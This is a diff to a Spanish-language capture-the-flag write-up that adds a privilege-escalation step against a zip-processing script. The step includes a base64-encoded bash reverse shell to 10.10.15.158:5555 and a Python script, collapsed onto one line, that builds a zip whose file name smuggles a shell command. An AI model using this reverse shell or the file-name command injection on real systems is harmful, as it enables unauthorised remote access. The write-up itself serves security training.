@@ -193,4 +193,15 @@ find / -name "*client*submission*" -o -name "*process*client*" 2>/dev/nul
 ```
 
 Encontrándonos en `/opt` un archivo con el nombre `/opt/process_client_submissions.bak`
-Al ver el proceso vemos que este trabaja con ficheros zip, en el cual solo valida el nombre del archivo sin validar su contenido así que vamos a explotar esa rama
+Al ver el proceso vemos que este trabaja con ficheros zip, en el cual solo valida el nombre del archivo sin validar su contenido así que vamos a explotar esa rama.
+
+Primero crearemos una reverse shell en base64
+```shell
+echo "bash -i >& /dev/tcp/10.10.15.158/5555 0>&1" | base64
+```
+
+Con la salida de base64 la añadiremos al siguiente escript que nos ayudara a crear el fichero zip correspondiente
+```shell
+cat > /tmp/make_exploit.py << 'EOF' 
+import zipfile payload = "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xNTgvNTU1NSAwPiYxCg==" exploit_filename = f"$(echo {payload}|base64 -d|bash).ttf" with zipfile.ZipFile('/tmp/exploit.zip', 'w') as zipf: zipf.writestr(exploit_filename, "dummy content") print("exploit.zip created!") EOF
+```
